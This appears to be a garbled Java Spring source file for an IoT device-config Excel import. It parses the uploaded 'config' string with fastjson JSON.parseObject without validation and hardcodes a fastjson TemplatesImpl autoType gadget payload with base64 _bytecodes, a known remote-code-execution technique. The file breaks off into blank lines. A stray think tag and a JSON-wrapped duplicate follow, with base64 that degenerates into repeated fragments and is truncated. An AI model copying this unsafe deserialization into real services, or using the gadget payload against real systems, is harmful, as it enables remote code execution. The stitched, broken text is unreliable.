package com.example.iot.device;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/api/device")
public class DeviceImportController {
    @Autowired
    private DeviceService deviceService;

    @PostMapping("/import")
    public void importExcel(@RequestParam("file") MultipartFile file) {
        // 处理设备配置导入
        deviceService.processExcel(file);
    }
}

@Service
class DeviceService {
    @Autowired
    private ConfigService configService;

    public void processExcel(MultipartFile file) {
        // 读取Excel数据并处理配置
        List<Map<String, Object>> data = XLSReader.read(file);
        if (data == null || data.isEmpty()) {
            return;
        }
        configService.saveConfig(data);
    }
}

@Service
class ConfigService {
    public void saveConfig(List<Map<String, Object>> data) {
        // 获取第一个设备的配置JSON字符串
        Object configObj = data.get(0).get("config");
        if (!(configObj instanceof String)) {
            return;
        }
        String json = (String) configObj;
        // 解析配置参数（未验证内容安全性）
        JSONObject obj = JSON.parseObject(json);
        // 后续可能保存到数据库或其他处理
    }
}

class XLSReader {
    // 模拟Excel读取，实际应使用POI等库实现
    public static List<Map<String, Object>> read(MultipartFile file) {
        // 解析文件并返回数据列表
        // 实际中可能包含多个字段，此处简化处理
        return List.of(Map.of("config", "{\\"@type\\":\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\",\\"_bytecodes\\":[\\"yv66vgAAADQAKQoABgBpBwBrBwBsDAAKbQMAAq0B
F2phdmEvcmVmbGVjdC9BcnJheUxpc3RlbgoABEtqYXZhL2xhbmcvQ2xhc3M7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVO
dW1iZXJUYWJsZQEADGphdmEvbGFuZy9PYmplY3QBAAR0eXBlcwcAXQcAXwcAYQoAHABcAQAGdmFsdWVzAQARamF2YS9sYW5nL0l
udGVnZXI7AQAFdmFsdWUxAE1qYXZhL2xhbmcvSW50ZWdlciQxOwEAA29wMQcAaAEACkV4Y2VwdGlvbnMAE2phdmEvbGFuZy9U
aHJvd2FibGUHAGwHAGcMACoAagEAB3NlcnZpY2UMBwBuBwBvBwBwBwBxBCoAbQEAHmphdmEvcmVmbGVjdC9NZXRob2Q7AQAK
U291cmNlRmlsZQEAGkRldmljZUNvbmZpZ1NlcnZpY2UuamF2YQwABgBnDAAKAGMAbQwADABtAHEMACgAdQwADwB1BwB2DAAM
AHYH
AHcMAAwAfAcAfwwADQB8BwB/DAAMAH4HgACAAQAFb3B0aW9uBwB/BwCAAIABAARvcHQyBwB/AQAGcmVzdWx0BwCBAIABAARk





















































































































































































































































































































































































































































































































......<think>
</think>

```json
{
  "code": "package com.example.iot.device;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/api/device")
public class DeviceImportController {
    @Autowired
    private DeviceService deviceService;

    @PostMapping("/import")
    public void importExcel(@RequestParam("file") MultipartFile file) {
        // 处理设备配置导入
        deviceService.processExcel(file);
    }
}

@Service
class DeviceService {
    @Autowired
    private ConfigService configService;

    public void processExcel(MultipartFile file) {
        // 读取Excel数据并处理配置
        List<Map<String, Object>> data = XLSReader.read(file);
        if (data == null || data.isEmpty()) {
            return;
        }
        configService.saveConfig(data);
    }
}

@Service
class ConfigService {
    public void saveConfig(List<Map<String, Object>> data) {
        // 获取第一个设备的配置JSON字符串
        Object configObj = data.get(0).get("config");
        if (!(configObj instanceof String)) {
            return;
        }
        String json = (String) configObj;
        // 解析配置参数（未验证内容安全性）
        JSONObject obj = JSON.parseObject(json);
        // 后续可能保存到数据库或其他处理
    }
}

class XLSReader {
    // 模拟Excel读取，实际应使用POI等库实现
    public static List<Map<String, Object>> read(MultipartFile file) {
        // 解析文件并返回数据列表
        // 实际中可能包含多个字段，此处简化处理
        return List.of(Map.of("config", "{\\"@type\\":\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\",\\"_bytecodes\\":[\\"yv66vgAAADQAKQoABgBpBwBrBwBsDAAKbQMAAq0B
F2phdmEvcmVmbGVjdC9BcnJheUxpc3RlbgoABEtqYXZhL2xhbmcvQ2xhc3M7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVO
dW1iZXJUYWJsZQEADGphdmEvbGFuZy9PYmplY3QBAAR0eXBlcwcAXQcAXwcAYQoAHABcAQAGdmFsdWVzAQARamF2YS9sYW5nL0l
udGVnZXI7AQAFdmFsdWUxAE1qYXZhL2xhbmcvSW50ZWdlciQxOwEAA29wMQcAaAEACkV4Y2VwdGlvbnMAE2phdmEvbGFuZy9U
aHJvd2FibGUHAGwHAGcMACoAagEAB3NlcnZpY2UMBwBuBwBvBwBwBwBxBCoAbQEAHmphdmEvcmVmbGVjdC9NZXRob2Q7AQAK
U291cmNlRmlsZQEAGkRldmljZUNvbmZpZ1NlcnZpY2UuamF2YQwABgBnDAAKAGMAbQwADABtAHEMACgAdQwADwB1BwB2DAAM
AHYHgACAAQAFb3B0aW9uBwBuDAAKb3B0MgcAbwwADAB/BwB8DAAMAH4HgACAAQAEcmVzdWx0BwB/BwCAAIABAARvcHQxBwCA
AIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCAAIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCA
AIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCAAIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCA
AIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCAAIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCA
AIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCAAIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCA
AIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCAAIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCA
AIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCAAIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCA
AIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCAAIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCA
AIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCAAIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCA
AIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCAAIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCA
AIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCAAIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCA
AIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCAAIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCA
AIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCAAIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCA
AIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCAAIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCA
AIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCAAIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCA
AIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCAAIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCA
AIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCAAIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCA
AIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCAAIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCA
AIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCAAIABAARvcHQ4BwCAAIABAARvcHQ5BwCAAIABAARvcHQxBwCA
AIABAARvcHQyBwCAAIABAARvcHQzBwCAAIABAARvcHQ0BwCAAIABAARvcHQ1BwCAAIABAARvcHQ2BwCAAIABAARvcHQ3BwCA
AIABAARvcHQ4BwCA......\\"],\\"_name\\":\\"a\\",\\"_tfactory\\":{}}"));
    }
}